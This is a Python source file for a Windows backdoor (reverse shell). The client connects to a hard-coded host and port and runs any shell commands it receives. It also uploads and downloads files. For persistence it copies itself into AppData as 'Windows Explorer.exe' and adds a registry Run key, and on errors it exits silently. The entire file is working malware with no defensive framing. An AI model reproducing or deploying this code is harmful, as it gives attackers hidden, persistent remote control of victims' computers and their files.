#!/usr/bin/env python
import socket,json
import subprocess,os,base64
import sys,shutil
class Backdoor:
	"""Backdoor"""
	def __init__(self, ip,port):
		self.become_persistent()
		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip,port))

	def become_persistent(self):
		evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
		if not os.path.exists(evil_file_location):	
			shutil.copyfile(sys.executable,evil_file_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)
	def reliable_send(self,data):
		json_data=json.dumps(data)
		self.connection.send(json_data)

	def read_file(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())

	def write_file(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+]Upload successfull"
	
	def change_working_directory(self,path):
		os.chdir(path)
		return "[+]Changing working directory to "+path
	
	def reliable_receive(self):
		json_data=""
		while True:
			try:
				json_data=json_data+str(self.connection.recv(1024))
				return json.loads(json_data)
			except ValueError:
				continue
		
	def execute_system_command(self,command):
		DEVNULL = open(os.devnull,'wb')
		return subprocess.check_output(command,shell=True,stderr=DEVNULL,stdin=DEVNULL)
	
	def run(self):
		while True:
			rec=self.reliable_receive()
			try:
				if rec[0]=="exit":
					self.connection.close()
					sys.exit()
				elif rec[0]=="cd" and len(rec)>1:
					command_res = self.change_working_directory(rec[1])
				elif rec[0]=="download":
					command_res=self.read_file(rec[1])
				elif rec[0]=="upload":
					command_res=self.write_file(rec[1],rec[2])
				else:
					command_res = self.execute_system_command(rec)
				
			except Exception:
				command_res="[-] Error while execution"
			self.reliable_send(command_res)


try:
    my_backdoor = Backdoor("10.0.2.7",4444)
    my_backdoor.run()
except Exception:
    sys.exit()
